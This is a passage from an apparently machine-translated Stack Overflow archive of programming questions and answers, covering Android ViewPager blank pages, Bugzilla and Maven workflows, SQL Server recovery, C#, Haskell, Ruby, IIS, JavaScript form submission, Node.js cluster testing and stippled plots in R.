    }); 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-07-31T09:44:19.457

Android 支持库有一个演示活动，其中包括一个 ViewPager，每个页面上都有一个 ListView。您可能应该看看它的作用。

在 Eclipse 中（使用 Android 开发工具 r20）：

1.  选择`New > Android Sample Project`
2.  选择您的目标 API 级别（我建议最新可用的）
3.  选择`Support4Demos`
4.  右键单击项目并选择`Android Tools > Add Support Library`
5.  运行应用程序并选择`Fragment`然后`Pager`

代码在`src/com.example.android.supportv4.app/FragmentPagerSupport.java`. 祝你好运！

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-07-31T17:31:08.130

我遇到了这个并且有非常相似的问题。我什至在堆栈溢出时[问过它。](https://stackoverflow.com/questions/11659493/viewpager-pageradapter-shows-blank-pages-after-first-two-items/11729189#11729189)

对我来说，在我认为的*父级的父*`LinearLayout`级中，有人`requestLayout()`在没有调用`super.requestLayout()`. 这阻止`onMeasure`并`onLayout`在我的 ViewPager 上被调用（尽管 hierarchyviewer 手动调用这些）。在没有被测量的情况下，它们将在 ViewPager 中显示为空白。

因此，请检查您的包含视图。确保它们是 View 的子类，并且不要盲目地覆盖 requestLayout 或类似的东西。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2012-12-19T22:42:38.540

有同样的问题，这与`ListView`（因为如果列表为空，我的空视图显示得很好）。我只是打电话`requestLayout()`给有问题的`ListView`。现在画得很好！

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2015-08-30T16:57:24.960

我在使用 ViewPager 和 FragmentStatePagerAdapter 时遇到了同样的问题。我尝试使用延迟 3 秒的处理程序来调用 invalidate() 和 requestLayout() 但它不起作用。起作用的是按如下方式重置 viewPager 的背景颜色：

MyFragment.java

```
 private Handler mHandler;
    private Runnable mBugUpdater;

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
            Bundle savedInstanceState) {
        View rootView = new ViewPager(getActivity());
        //...Create your adapter and set it here...

        mHandler = new Handler();
        mBugUpdater = new Runnable(){
            @Override
            public void run() {
                mVp.setBackgroundColor(mItem.getBackgroundColor());
                mHandler = null;
                mBugUpdater = null;
            }           
        };
        mHandler.postDelayed(mBugUpdater,50);

        return rootView;
    }

    @Override
    public void onPause() {
        if(mHandler != null){
            //Remove the callback if it hasn't triggered yet
            mHandler.removeCallbacks(mBugUpdater);
            mHandler = null;
            mBugUpdater = null;
        }
        super.onPause();
     } 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2017-02-02T03:40:09.097

我遇到了相同症状的问题，但原因不同，结果证明这是我的一个愚蠢的错误。以为我会在这里添加它，以防它帮助任何人。

我有一个使用 FragmentStatePagerAdapter 的 ViewPager，它曾经有两个片段，但后来我添加了第三个。但是，我忘记了默认的屏幕外页面限制是 1 - 所以，当我切换到新的第三个片段时，第一个片段会被破坏，然后在切换回来后重新创建。问题是我的活动负责通知这些片段以初始化它们的 UI 状态。当 Activity 和 Fragment 生命周期相同时，这恰好起作用，但要修复它，我必须更改 Fragment 以在其启动生命周期中初始化它们自己的 UI。最后，我还将 setOffscreenPageLimit 更改为 2，以便所有三个片段始终保持活动状态（在这种情况下是安全的，因为它们不是非常占用内存）。

* * *

## 回答 #11

> 赞同：-1
> 
> 时间：2013-05-24T14:38:40.377

我有类似的问题。我缓存视图，因为我只需要 3 个视图`ViewPager`。当我向前滑动时一切正常，但是当我开始向后滑动时发生错误，它说“我的视图已经有一个父视图”。解决方案是手动删除不需要的项目。

```
@Override
    public Object instantiateItem(ViewGroup container, int position) {
        int localPos = position % SIZE;
        TouchImageView view;
        if (touchImageViews[localPos] != null) {
            view = touchImageViews[localPos];
        } else {
            view = new TouchImageView(container.getContext());
            view.setLayoutParams(new LayoutParams(LayoutParams.WRAP_CONTENT, LayoutParams.WRAP_CONTENT));
            touchImageViews[localPos] = view;
        }
        view.setImageDrawable(mDataModel.getPhoto(position));
        Log.i(IRViewPagerAdpt.class.toString(), "Add view " + view.toString() + " at pos: " + position + " " + localPos);
        if (view.getParent() == null) {
        ((ViewPager) container).addView(view);
    }
        return view;
    }

    @Override
    public void destroyItem(ViewGroup container, int position, Object view) {
        //      ((ViewPager) container).removeView((View) view);
        Log.i(IRViewPagerAdpt.class.toString(), "remove view " + view.toString() + " at pos: " + position);
    }

..................

private static final int SIZE = 3;
private TouchImageView[] touchImageViews = new TouchImageView[SIZE]; 
```

* * *

## 回答 #12

> 赞同：-1
> 
> 时间：2017-01-03T18:19:46.503

对我来说，问题是在应用程序进程被杀死后回到活动。我正在使用从 Android 源修改的自定义视图寻呼机适配器。视图寻呼机直接嵌入在活动中。

打电话`viewPager.setCurrentItem(position, true);`

（带动画）设置数据后 notifyDataSetChanged() 似乎工作，但如果参数设置为 false 它不会，并且片段是空白的。这是一个边缘案例，可能对某人有帮助。

* * *

## 回答 #13

> 赞同：-1
> 
> 时间：2020-11-27T15:59:59.617

对于 Kotlin 用户：

在你的碎片中；使用`childFragmentManager`代替`viewPagerAdapter`

# objective-c - iOS - 如何逐页显示ppt文件

> ID：11736955
> 
> 赞同：1
> 
> 时间：2012-07-31T09:24:36.193
> 
> 标签：objective-c, ios, quartz-2d

我想将 ppt（或 pptx）文件渲染到图像列表中。

非常感谢~

# bugzilla - 如何将数据从 Bugzilla 版本 3.0 导入到最新的 4.2。我正在使用 MySQL 数据库

> ID：11736956
> 
> 赞同：0
> 
> 时间：2012-07-31T09:24:41.233
> 
> 标签：bugzilla

我已经在 Linux Centos 上安装了新版本。我是安装在另一台机器上的旧版本。现在想将所有旧数据导入到最新版本。如果您已经完成此过程，请留下建议。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T05:03:55.283

这在 Bugzilla wiki 中有详细记录。请参阅[https://wiki.mozilla.org/Bugzilla:Move_Installation](https://wiki.mozilla.org/Bugzilla:Move_Installation)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-30T15:09:54.073

一旦你的数据库被重新加载到你想要的地方，你只需要[像这里解释的那样处理](http://www.bugzilla.org/docs/tip/en/html/installation.html#install-bzfiles)，BugZilla 将检查你的数据库并单独升级它。该工具非常适合成功测试从 bgz 2.2.21 到 3.5 的升级；）

# php - 获取产品列表属性值的最快方法

> ID：11736961
> 
> 赞同：2
> 
> 时间：2012-07-31T09:24:54.730
> 
> 标签：php, magento

我正在寻找在产品列表页面上获取可配置产品属性值的最有效方法，例如产品的颜色值（来自分配的简单产品）

目前正在考虑`catalog_product_flat_n`为此目的使用表格，但也许有更简单或更正确的方法来做到这一点？我试图避免使用

```
$product->getTypeInstance()->getConfigurableAttributesAsArray() 
```

在每个产品上，因为这会很慢

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T10:47:28.227

我有同样的问题，所以我创建了自己的资源模型来从平面表中获取数据，查看下面的代码

```
 <?php

    class NameSpace_ModuleName_Model_Resource_Colors extends
        Mage_Core_Model_Resource_Db_Abstract
    {
        protected $_storeId;

        protected function _construct()
        {
            $this->_init('catalog/product_flat', 'entity_id');
            $this->_storeId = (int)Mage::app()->getStore()->getId();
        }

        public function getData($entityId)
        {
            $resource = Mage::getSingleton('core/resource');
            $select = $resource->getConnection('core_read')->select();
            $select
                ->from($this->getTable(array('catalog/product_flat', $this->_storeId)), '*')
                ->where('entity_id = :entity_id');

            $result = $resource->getConnection('core_read')->fetchAll($select, array('entity_id' => $entityId));

            return $result;
        }
    } 
```

希望对你有帮助

# sql - 我们可以检查谁从 SQL Server 2008 中删除了什么

> ID：11736962
> 
> 赞同：2
> 
> 时间：2012-07-31T09:24:54.837
> 
> 标签：sql, sql-server-2008, windows-server-2008, data-recovery

几周前有人从 SQL Server 2008 中一个非常重要的表中删除了几行，我想知道我是否可以检查日志或其他内容，或者是否可以恢复这些行。

干杯

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-31T09:30:16.787

如果您有某种备份，您可以恢复记录。如果您记录每个操作，那么您应该能够检查它。

最后，[这个链接](https://stackoverflow.com/questions/4101465/how-i-can-view-the-deleted-records-from-a-sql-server-table)正在质疑同样的问题。在对该问题的评论中，您可以找到[有关如何阅读事务日志的其他链接](http://sqlfascination.com/2010/02/03/how-do-you-decode-a-simple-entry-in-the-transaction-log-part-1/)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-31T09:32:28.020

作为上一个答案的补充，“下一次”发生这种情况的最简单方法是使[CDC](http://msdn.microsoft.com/en-us/library/bb522489%28v=sql.105%29.aspx)能够跟踪您的表上的更改。

[这](http://www.simple-talk.com/sql/learn-sql-server/introduction-to-change-data-capture-%28cdc%29-in-sql-server-2008/)是一篇非常好的文章

# c# - 如何在 Win C# 中更改 GridView 中的行选择器

> ID：11736965
> 
> 赞同：1
> 
> 时间：2012-07-31T09:25:07.900
> 
> 标签：c#, .net, winforms

我在 C#.Net2010 中有 Windows 应用程序。我添加了带有一些 Comobobox 和 CheckBox 列的 griview。

我在 GridView 中为一些与数据相关的问题设置了一些只读行。

现在，当事件用户从组合框列中选择一些值并按 Enter 时，如果下一行是只读的，我想将 rowSelector 设置为非只读的行

我写了以下代码：

```
 for (int i = gridAttendanceEntry.CurrentRow.Index + 1; i < gridAttendanceEntry.Rows.Count; i++)
             {
                 if (!gridAttendanceEntry.Rows[i].ReadOnly)
                 {
                     gridAttendanceEntry.Rows[i].Selected = true;
                     this.gridAttendanceEntry.FirstDisplayedScrollingRowIndex = i;
                     break;
                 }
                 if (i == gridAttendanceEntry.Rows.Count - 1)
                     i = 0;
             } 
```

如何以编程方式更改行选择器？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T09:31:52.103

1.  获取选中/聚焦的行索引
2.  暂时将其保存到整数变量并执行 + 1
3.  检查具有新索引的行是否是只读的。不是？选择它，否则添加 1 并再次执行第 3 步

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-08T13:43:40.393

```
if (!gridAttendanceEntry.Rows[i].ReadOnly) 
{ 
     gridAttendanceEntry.Rows[i].Selected = true; 
     this.gridAttendanceEntry.FirstDisplayedScrollingRowIndex = i; 
     break; 
}
else
{
     gridAttendanceEntry.Rows[i].Selected = false;
} 
```

你需要这个 else 语句。我确实相信控件的默认行为是在组合框中进行更改后选择下一行。在您的情况下，当该行是只读的时，您需要通过手动取消选择它来确保没有发生这种情况。

# haskell - 无法从等差数列 `(x - n + 1) .. x' 中推断出 (Enum a)

> ID：11736967
> 
> 赞同：1
> 
> 时间：2012-07-31T09:25:08.367
> 
> 标签：haskell, syntax

当我尝试编译这段代码时

```
prod [] = 1
prod (x:xs) = x * prod xs

ff :: (Num a) => a -> a -> a
ff x n = prod [(x - n + 1) .. x] 
```

我收到以下错误：

```
a.hs:5:15:
    Could not deduce (Enum a)
     arising from the arithmetic sequence `(x - n + 1) .. x'
    from the context (Num a)
      bound by the type signature for ff :: Num a => a -> a -> a
      at a.hs:5:1-32
    Possible fix:
      add (Enum a) to the context of
        the type signature for ff :: Num a => a -> a -> a
    In the first argument of `prod', namely `[(x - n + 1) .. x]'
    In the expression: prod [(x - n + 1) .. x]
    In an equation for `ff': ff x n = prod [(x - n + 1) .. x] 
```

这段代码有什么问题？当我代替`Double`一个一切都好。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-31T09:44:04.253

`[i .. j]`是 的简写`enumFromTo i j`。`enumFromTo`是类型类的一部分，而[`Enum`](http://www.haskell.org/ghc/docs/latest/html/libraries/base/Prelude.html#t%3aEnum)不是[`Num`](http://www.haskell.org/ghc/docs/latest/html/libraries/base/Prelude.html#t%3aNum)（你仍然需要`Num`使用）的一部分。`+``-`

所以你需要说`a`实现`Enum`以及实现`Num`：

```
ff :: (Num a, Enum a) => a -> a -> a
ff x n = prod [(x - n + 1) .. x] 
```

它适用，`Double`因为`Double`实现了这两个类型类。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-31T09:33:13.373

为了`[x .. y]`工作，结果类型根本不需要是一个`Num`实例（例如，`['A'..'Z']`工作得很好）。它必须是一个`Enum`实例。只需添加`Enum`到类型签名。

它适用于`Double`因为`Double`有两个实例。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-31T09:32:08.303

`ff :: (Enum a, Num a) => a -> a -> a
ff x n = prod [(x - n + 1) .. x]`

# ruby - 将哈希值作为参数传递给 Ruby 中的方法

> ID：11736969
> 
> 赞同：0
> 
> 时间：2012-07-31T09:25:29.223
> 
> 标签：ruby, methods, hash, parameters

我有一个方法met1，它将哈希值作为参数。

例如：`met1('abc' => 'xyz')`

定义方法时应该使用什么语法？会是这样吗？

```
def met1(options)
  puts options
end 
```

我知道上面的语法有效。但是我怎样才能访问内部的单个哈希键和值`met1`？（关键在哪里`abc`，价值在`xyz`哪里？）谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T09:27:22.857

你的语法是正确的。只需在您的方法中使用 options['key'] （如果 'key' 是一个字符串）。通常使用符号作为键，因此在您的示例中：

```
met1(:abc => 'xyz')

def met1(options)
  puts options[:abc]
end 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T09:29:41.917

这很容易

```
met1("abc" => "xyz")

def met1(options)
  puts options
  # with key
  puts options["abc"]
end 
```

我假设您知道选项可能包含哪些键，对吧？如果不，

```
def met1(options)
  puts options.keys # options is the hash you passed it, use it like one
end 
```

# c# - IIS aways 返回一个空页面

> ID：11736976
> 
> 赞同：0
> 
> 时间：2012-07-31T09:25:43.370
> 
> 标签：c#, iis

我正在部署一个作为一组项目构建的站点，该解决方案被部署为一系列网站（一个项目=一个 url）。

编码语言是 c#，该站点使用通过 linq 访问的 mssql db。

在开发服务器上一切正常，但目前，所有具有动态创建元素的页面（即所有`<asp>`和自定义标签）都会输出一个空白页面，其中包含以下源代码。静态页面（标准 html 和 aspx）正确显示。

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML><HEAD>
<META content="text/html; charset=windows-1252" http-equiv=Content-Type></HEAD>
<BODY></BODY></HTML> 
```

我通常在 LAMP 上使用 php，这种行为不同于我在该设置中看到的任何东西。我需要一些关于此错误的原因/解决方案的新想法（最好是逐步/教程链接 - 就像我说的 IIS/c#.net 不是我的正常环境）。

我尝试过的事情没有任何效果：

*   更改站点文件夹的权限
*   更改 web.config 设置
*   通过复制/粘贴和具有各种设置的 vb 发布选项重新部署站点文件
*   加上一整吨（到目前为止超过两天）的互联网研究

感谢所有回复。

编辑：版本号：

iis: v6.1 (bulid: 7601) 操作系统: Windows web server 2008 R2 / Service pack 1 .net: v4

第二次编辑：

示例页面：

.aspx 文件：

```
<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="dbtest.aspx.cs" Inherits="Rica.Yoodul.dbtest" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title></title>
</head>
<body>
    <form id="form1" runat="server">
    <div>
    <h1>test</h1>

        <asp:Literal ID="Literal1" runat="server"></asp:Literal>
    </div>
    </form>
</body>
</html> 
```

aspx.cs

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Data.SqlClient;

namespace Rica.Yoodul
{
    public partial class dbtest : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {
            SqlConnection myConnection = new SqlConnection(System.Configuration.ConfigurationManager.ConnectionStrings["RicaConnectionString"].ConnectionString);
            myConnection.Open();

            SqlDataReader myReader = null;
            SqlCommand myCommand = new SqlCommand("SELECT * FROM dbo.MaritialStatus", myConnection);

            myReader = myCommand.ExecuteReader();

            while (myReader.Read())
            {
                Literal1.Text = Literal1.Text + myReader["Name"].ToString();
            }
            myConnection.Close();
        }
    }
} 
```

编辑：

我没有添加的东西：基于服务器显示的其他一些行为，我认为最有可能的罪魁祸首是服务器配置错误。

编辑：

好的，我已经缩小了一些原因。通过在前端文件的第一行中取出除语言属性之外的所有内容，我可以让服务器显示静态内容。#

编辑：

OK [http://www.iis.net/ConfigReference](http://www.iis.net/ConfigReference)涵盖了 iis 配置文件的使用。只有我去了页面上指示的路径，我似乎根本没有任何配置文件。我该如何确认/解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T11:06:52.027

听起来您的生产服务器没有正确安装/注册 ASP.NET，因此您的页面被视为简单的文本文档而不是代码。例如，如果在安装 IIS 之前安装 .NET，有时会发生这种情况。

为了确认这一点，将一个包含 HTML 和 ASP.NET 混合的准系统页面放在一起......

```
<%@ Page Language="C#" %>
<html>
    <head>
        <title>ASP.NET Hello World</title>
    </head>
    <body>
        <p>Hello from HTML</p>
        <p><%= "Hello from ASP.NET" %></p>
    </body>
</html> 
```

如果您加载它并且只获得纯 HTML 问候语，请使用浏览器的“查看源代码”选项并查看您实际获得的内容。如果您的 ASP.NET 源代码显示在浏览器接收的源代码中，则表明 IIS 没有将其视为 ASP.NET 文件 - 这意味着 ASP.NET 未正确安装或被禁用。

# javascript - 从 javascript 发送输入

> ID：11736979
> 
> 赞同：0
> 
> 时间：2012-07-31T09:25:49.973
> 
> 标签：javascript, html, web, click, enter

***如何将输入从 javascript 发送到网站？***

我真正需要的是在搜索框中将文本发送到像 filehippo.com 这样的网站，然后按 Enter 搜索这些文本。
所以网站上的一段代码是：

```
<div id="searchbox">
<form name="f" action="/search">
<input style="color: #999" type="text" id="q" name="q" maxlength="150" value="Search..." onfocus="javascript:clearInputValue('q', 'Search...')" onblur="javascript:setDefaultIfEmpty('q', 'Search...')">
<input type="submit" id="search-submit" value="GO" onclick="javascript:submitQuery('q', 'Search...')">
</form></div> 
```

我的简单代码如下所示：

```
javascript: document.getElementById('q').focus();document.getElementById('q').value='Winrar';document.getElementById('f').item(0).click(); 
```

而那些脚本只是把焦点放在搜索框上并向他们发送文本，但我还需要自动搜索（发送回车），怎么做？

```
document.getElementById('f').item(0).click(); -> dont work 
```

我需要的是通过回车模拟鼠标点击，导致无法将点击发送到正常工作的元素。

是否可以发送带有文本的输入？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-31T09:28:47.630

用于`document.f.submit();`提交表单。

问题是有多个名为“f”的表单

```
javascript:document.f[0].submit(); 
```

所以功能齐全的线路将是：

```
javascript:document.getElementById('q').value='Winrar';document.f[0].submit(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T09:43:05.407

使用输入元素的 onkeypress 属性。

# node.js - 如何测试 Node.JS 集群中的 master 行为？

> ID：11736980
> 
> 赞同：6
> 
> 时间：2012-07-31T09:25:54.663
> 
> 标签：node.js, testing

假设您正在 Node.JS 中运行一个集群，并且您希望对其进行单元测试。例如，您想确保如果一个工作人员死亡，集群会采取一些措施，例如分叉另一个工作人员和可能的一些相关工作。或者，在某些条件下，会产生额外的工人。

我想为了做到这一点，必须启动集群并以某种方式访问​​其内部状态；然后（例如）强迫工人卡住，并在延迟后检查状态。如果是这样，如何导出状态？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-05-26T15:14:53.050

您必须构建您的 master 以返回对其集群对象的引用。在您的测试中，您可以使用`cluster.workers[2].kill()`. worker 对象还具有对子进程对象的引用，您可以使用它来模拟各种条件。您可能必须使用 setTimeout 来确保 master 有时间做它的事情。

然而，上述方法仍然会创建分叉，这在测试场景中可能是不可取的。您的另一个选择是使用模拟库（SinonJS 等）来模拟`cluster`的 fork 方法，然后监视它获得的调用次数。您可以通过`cluster.emit('exit')`在主集群对象上使用来模拟工作人员死亡。

注意：我不确定这是否只是我的问题，但`cluster.emit`出于某种原因，我似乎总是发出两次。

# functional-programming - 购物篮的功能方法

> ID：11736982
> 
> 赞同：0
> 
> 时间：2012-07-31T09:25:59.297
> 
> 标签：functional-programming

我正在阅读[http://www.infoq.com/interviews/trelford-functional](http://www.infoq.com/interviews/trelford-functional)并试图了解 OO 的替代方法。

> 问：你看到你在 GOTOCon 上做关于功能架构的演讲，那是什么？我认为所有架构都是面向对象的？
> 
> A 嗯，他们不是；我想强调一个想法，即您选择的语言和平台确实会以您的思维方式影响您的架构；选择一种功能性语言或架构如何真正使系统受益。
> 
> 如果我只是举一个简单的例子，比如我们编写一个零售应用程序，如果你只考虑对象和变异，那么你会认为当你构建一篮子项目时，当你添加一个项目时，你会增加数量，如果有人退回商品或取消商品，你会减少数量，你做错了。
> 
> 使用零售系统，您需要跟踪实际所做的事情，以便检测欺诈行为，这是系统的关键要素之一；所以你实际上每次都添加新值，你永远不会变异。
> 
> 因此，仅从我们每天与之交互的最基本系统之一来看，功能不变的风格实际上接近于您想要的架构。

如果您要在购物篮应用程序中采用更实用的样式，您会如何考虑这个问题？例如，您是否仍然有一个购物篮对象，而不是改变其内容，而是创建一个新对象或其他东西？

很多谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T18:17:19.513

这将是一个容器数据结构，其不变量对篮子的不变量进行建模（例如，类似[袋子的](http://hackage.haskell.org/packages/archive/multiset/0.2.1/doc/html/Data-MultiSet.html)数据类型）。该容器将是持久的，因此您可以透明地回滚到旧版本（以允许用户撤消操作，或保存以供以后访问）。

通过不破坏性地更新篮子，您可以免费获得回滚、撤消和持久性。

通过使用更丰富的数据类型，需要做的记录更少，因此出现错误的机会也更少。

# svn - 如何使用托管版本的依赖项构建 Maven 源导出

> ID：11736992
> 
> 赞同：1
> 
> 时间：2012-07-31T09:26:24.607
> 
> 标签：svn, maven, escrow

我们需要偶尔为某些客户提供源代码版本（由第三方托管）。

这需要包括：

*   主要的maven模块（或多模块）源代码
*   所有依赖 maven 模块的源代码，在我们的源代码存储库中可用
*   所有其他依赖模块的二进制文件（例如第三方外部库）。
*   任何其他 maven 依赖项，例如父 poms。

理想情况下，这应该是一个自动化过程。目前，我们不在 maven 存储库中存储源 jar，而是更愿意在 poms 中使用 scm 标签并从 svn 存储库中获取源。

`mvn scm:export`适用于单个模块。如果我们能以某种方式将它与 maven-dependency-plugin 结合起来（并确保包含 parentpom！），它可能会完成我们需要的大部分工作。有谁知道这样做的简单方法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T12:58:01.723

我建议在发布期间也将源包部署到 maven 存储库。之后，您可以从存储库管理器中提取项目的依赖项并将其打包到托管工具包中。这可以由一个单独的 maven 项目处理，该项目包含您需要打包为依赖项的所有项目，并使用程序集插件将其打包到一个 zip 存档中。源包。

# r - 在图像/等高线图中添加点画

> ID：11736996
> 
> 赞同：12
> 
> 时间：2012-07-31T09:26:39.847
> 
> 标签：r, plot, ggplot2, lattice

有一些我想添加“点画”的数据来显示它在哪里是“重要的”，就像他们在 IPCC 图中所做的那样

![http://www.ipcc.ch/graphics/ar4-wg1/jpg/fig-10-18.jpg](../Images/b905572635aabaaf15df9fa91b2ac88b.png)

目前，我真的在努力尝试在 R 中做到这一点。

如果我制作一些测试数据并绘制它：

```
data <- array(runif(12*6), dim=c(12,6) )
over <- ifelse(data > 0.5, 1, 0 )
image(1:12, 1:6, data) 
```

我最终想要做的是基于当前图像顶部的数组“over”过度绘制一些点。

有什么建议么！？？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-07-31T10:19:26.560

这应该会有所帮助 - 我以前做过类似的事情，并写了一个我在[这里](http://menugget.blogspot.de/2012/04/create-polygons-from-matrix.html)发布的函数。

```
#required function from www.menugget.blogspot.com
matrix.poly <- function(x, y, z=mat, n=NULL){
 if(missing(z)) stop("Must define matrix 'z'")
 if(missing(n)) stop("Must define at least 1 grid location 'n'")
 if(missing(x)) x <- seq(0,1,,dim(z)[1])
 if(missing(y)) y <- seq(0,1,,dim(z)[2])
 poly <- vector(mode="list", length(n))
 for(i in seq(length(n))){
  ROW <- ((n[i]-1) %% dim(z)[1]) +1
  COL <- ((n[i]-1) %/% dim(z)[1]) +1

  dist.left <- (x[ROW]-x[ROW-1])/2
  dist.right <- (x[ROW+1]-x[ROW])/2
  if(ROW==1) dist.left <- dist.right
  if(ROW==dim(z)[1]) dist.right <- dist.left

  dist.down <- (y[COL]-y[COL-1])/2
  dist.up <- (y[COL+1]-y[COL])/2
  if(COL==1) dist.down <- dist.up
  if(COL==dim(z)[2]) dist.up <- dist.down

  xs <- c(x[ROW]-dist.left, x[ROW]-dist.left, x[ROW]+dist.right, x[ROW]+dist.right)
  ys <- c(y[COL]-dist.down, y[COL]+dist.up, y[COL]+dist.up, y[COL]-dist.down)
  poly[[i]] <- data.frame(x=xs, y=ys)
 }
 return(poly)
}

#make vector of grids for hatching
incl <- which(over==1)

#make polygons for each grid for hatching
polys <- matrix.poly(1:12, 1:6, z=over, n=incl)

    #plot
png("hatched_image.png")
image(1:12, 1:6, data)
for(i in seq(polys)){
    polygon(polys[[i]], density=10, angle=45, border=NA)
    polygon(polys[[i]], density=10, angle=-45, border=NA)
}
box()
dev.off() 
```

![在此处输入图像描述](../Images/74d7719a73ff8c60211344f5d6bf4dfd.png)

或者，用“点画”替代：

```
png("hatched_image2.png")
image(1:12, 1:6, data)
for(i in seq(polys)){
    xran <- range(polys[[i]]$x)
    yran <- range(polys[[i]]$y)
    xs <- seq(xran[1], xran[2],,5)
    ys <- seq(yran[1], yran[2],,5)
    grd <- expand.grid(xs,ys)
    points(grd, pch=19, cex=0.5)
}
box()
dev.off() 
```

![在此处输入图像描述](../Images/b02e30b431caab69c6d0072e084107f4.png)

### 更新：

在（很晚）对 Paul Hiemstra 评论的回复中，这里有另外两个具有更高分辨率矩阵的示例。孵化保持一个很好的规则模式，但分解时不好看。点画的例子要好得多：

```
n <- 100
x <- 1:n
y <- 1:n
M <- list(x=x, y=y, z=outer(x, y, FUN = function(x,y){x^2 * y * rlnorm(n^2,0,0.2)}))
image(M)
range(M$z)
incl <- which(M$z>5e5)

polys <- matrix.poly(M$x, M$y, z=M$z, n=incl)

png("hatched_image.png", height=5, width=5, units="in", res=400)
op <- par(mar=c(3,3,1,1))
image(M)
for(i in seq(polys)){
  polygon(polys[[i]], density=10, angle=45, border=NA, lwd=0.5)
  polygon(polys[[i]], density=10, angle=-45, border=NA, lwd=0.5)
}
box()
par(op)
dev.off() 
```

[![在此处输入图像描述](../Images/6aef784a303f68e759f1780c52531fa1.png)](https://i.stack.imgur.com/80gaW.png)

```
png("stippled_image.png", height=5, width=5, units="in", res=400)
op <- par(mar=c(3,3,1,1))
image(M)
grd <- expand.grid(x=x, y=y)
points(grd$x[incl], grd$y[incl], pch=".", cex=1.5)
box()
par(op)
dev.off() 
```

[![在此处输入图像描述](../Images/d00e633bfe825857bceb6686be84a64f.png)](https://i.stack.imgur.com/myHFo.png)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-31T10:31:27.980

这是使用 ggplot2 的@mdsummer 评论精神的解决方案。我先画网格，然后`+`在超过某个值的位置画 es。请注意，它`ggplot2`适用于`data.frame`'s，而不适用于多维数组或矩阵。您可以使用`melt`from`reshape`包将数组 / marix 转换为 data.frame 平面结构。

这是使用文档中示例数据的具体示例`geom_tile`：

```
pp <- function (n,r=4) { 
 x <- seq(-r*pi, r*pi, len=n) 
 df <- expand.grid(x=x, y=x) 
 df$r <- sqrt(df$x^2 + df$y^2) 
 df$z <- cos(df$r^2)*exp(-df$r/6) 
 df 
} 

require(ggplot2)
dat = pp(200)
over = dat[,c("x","y")]
over$value = with(dat, ifelse(z > 0.5, 1, 0))
ggplot(aes(x = x, y = y), data = dat) + 
   geom_raster(aes(fill = z)) + 
   scale_fill_gradient2() +
   geom_point(data = subset(over, value == 1), shape = "+", size = 1) 
```

![在此处输入图像描述](../Images/955d0fd0d387049b4d6f5d1fe7f1785f.png)

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-07-31T21:45:08.490

`?image`使用[1]的坐标定位机制进行。

```
data(volcano)
m <- volcano
dimx <- nrow(m)
dimy <- ncol(m)

d1 <- list(x = seq(0, 1, length = dimx), y = seq(0, 1, length = dimy), z = m) 
```

通过以这种方式构建的“图像”，您可以保持与对象的结构及其坐标不变。您可以将多个矩阵收集到一个 3D 数组中或作为多个元素，但您需要扩充`image()`才能处理它，因此我将它们分开放置。

制作数据副本以指定感兴趣的区域。

```
d2 <- d1
d2$z <- d2$z > 155 
```

使用坐标指定感兴趣的单元格。如果您有一个非常大的光栅，这会很昂贵，但它非常容易做到。

```
pts <- expand.grid(x = d2$x, y = d2$y)
pts$over <- as.vector(d2$z) 
```

设置情节。

```
op <- par(mfcol = c(2, 1))
image(d1)

image(d1)
points(pts$x[pts$over], pts$y[pts$over], cex = 0.7)

par(op) 
```

不要忘记修改点的绘图以获得不同的效果，特别是具有很多点的非常密集的网格将需要很长时间才能绘制所有这些小圆圈。`pch = "."`是一个不错的选择。

现在，你有一些真实的数据可以绘制在那个漂亮的投影上吗？有关某些选项，请参见此处的示例：[http ://spatial-analyst.net/wiki/index.php?title=Global_datasets](http://spatial-analyst.net/wiki/index.php?title=Global_datasets)

[1] R 具有用于更复杂地处理栅格数据的类，请参阅包 sp 和 raster 了解两种不同的方法。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2016-05-10T19:55:12.033

这可能来得太晚了，但我也想发布我的答案作为参考。

空间数据的一个不错的选择是使用 rasterVis 包。一旦有了“基础”光栅对象和用于绘制点画的“蒙版”对象，就可以执行以下操作：

```
require(raster)
require(rasterVis)

# Scratch raster objects
data(volcano)
r1 <- raster(volcano)

# Here we are selecting only values from 160 to 180.
# This will be our "mask" layer.
over <- ifelse(volcano >=160 & volcano <=180, 1, NA) 
r2 <- raster(over)

# And this is the key step:
# Converting the "mask" raster to spatial points
r.mask <- rasterToPoints(r2, spatial=TRUE)

# Plot
